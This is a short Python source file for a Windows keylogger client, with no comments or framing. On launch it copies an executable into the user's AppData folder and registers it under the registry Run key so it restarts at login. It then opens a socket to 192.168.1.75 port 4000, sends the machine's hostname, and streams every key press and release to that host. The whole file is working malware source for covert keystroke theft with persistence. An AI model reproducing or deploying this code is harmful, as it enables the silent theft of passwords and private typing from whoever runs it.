def main():
    import socket
    from pynput import keyboard

    HOST = "192.168.1.75"
    PORT = 4000
    FORMAT = "utf-8"
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.send(socket.gethostname().encode())
        while True:
            try:
                def on_press(keys):
                    keys = str(keys)
                    s.send((keys + " PRESSED ").encode(FORMAT))
                def on_release(keys):
                    keys = str(keys)
                    s.send((keys + " RELEASED ").encode(FORMAT))
                with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
                    listener.join()
            
            except ConnectionResetError:
                exit(0)
            except ConnectionRefusedError:
                exit(0)
            except TimeoutError:
                exit(0)
            except OSError:
                exit(0)

if __name__ == "__main__":
    import winreg
    import os
    username = os.getlogin()
    os.system(f"copy client_keyboard.exe C:\\Users\\{username}\\AppData\\Roaming")
    key = winreg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    winreg.SetValueEx(winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS), "4000_Port_keyboard", 0, winreg.REG_SZ, f"C:\\Users\\{username}\\AppData\\Roaming\\client_keyboard.exe")
    
    main()